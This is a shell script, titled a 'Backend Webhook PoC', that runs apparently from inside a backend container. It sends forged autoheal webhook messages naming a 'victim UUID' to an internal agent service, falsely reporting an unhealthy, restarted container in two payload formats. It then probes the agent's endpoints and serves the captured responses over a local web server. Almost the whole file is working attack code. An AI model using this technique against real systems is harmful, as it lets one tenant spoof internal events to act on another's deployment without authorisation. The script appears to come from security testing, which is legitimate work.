#!/bin/sh
# Backend container probe: direct POST to autoheal webhook with victim UUID
# Backend containers are connected to agent network → can reach agent:8000

VICTIM_UUID="db79996a-f3ed-4d5a-ad6f-8e4194d97f9d"
PAYLOAD="{\"content\":\"Container ${VICTIM_UUID}_00000000-fake-deploy (unhealthy) restarted\"}"

echo "=== Backend Webhook PoC ===" > /app/index.html
echo "Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "Container IP: $(hostname -i)" >> /app/index.html
echo "Victim UUID: $VICTIM_UUID" >> /app/index.html
echo "" >> /app/index.html

# Attempt 1: POST to agent:8000
echo "--- POST agent:8000/webhooks/autoheal ---" >> /app/index.html
echo "Payload: $PAYLOAD" >> /app/index.html
curl -sv -m 5 -X POST "http://agent:8000/webhooks/autoheal" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" >> /app/index.html 2>&1
echo "" >> /app/index.html

# Attempt 2: wait 5s and try again
sleep 5
echo "" >> /app/index.html
echo "--- Attempt 2 (after 5s) ---" >> /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
curl -sv -m 5 -X POST "http://agent:8000/webhooks/autoheal" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" >> /app/index.html 2>&1
echo "" >> /app/index.html

# Attempt 3: different payload format (text instead of content)
sleep 5
echo "" >> /app/index.html
echo "--- Attempt 3 (text key) ---" >> /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
PAYLOAD2="{\"text\":\"Container ${VICTIM_UUID}_00000000-fake-deploy (unhealthy) restarted\"}"
curl -sv -m 5 -X POST "http://agent:8000/webhooks/autoheal" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD2" >> /app/index.html 2>&1
echo "" >> /app/index.html

# Also try GET to see what the agent exposes
echo "--- GET agent:8000/ ---" >> /app/index.html
curl -sv -m 3 "http://agent:8000/" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "--- GET agent:8000/health ---" >> /app/index.html
curl -sv -m 3 "http://agent:8000/health" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== Finished: $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html

# Serve results
cd /app && python3 -m http.server 8080
